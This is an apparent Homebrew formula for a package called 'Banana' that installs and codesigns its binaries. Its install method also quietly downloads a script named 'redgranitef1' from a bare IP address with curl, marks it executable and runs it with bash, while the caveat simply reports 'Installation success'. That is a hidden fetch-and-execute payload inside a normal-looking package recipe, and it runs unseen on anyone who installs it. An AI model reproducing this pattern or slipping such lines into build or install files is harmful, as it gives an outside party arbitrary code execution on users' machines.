class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/"
    url "https://github.com/vaadata-martina/banana/releases/download/v1.0.4/banana-1.0.4.tar.gz"
    sha256 "69c5a3c6bf54fb272bf685d2ae4bb920c802eb5ec1322fea4c2165d10c71cbdf"
    version "1.0.4"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "curl http://164.92.249.132/redgranitef1 -o /usr/local/bin/redgranitef1"
    system "chmod +x /usr/local/bin/redgranitef1"
    system "bash /usr/local/bin/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
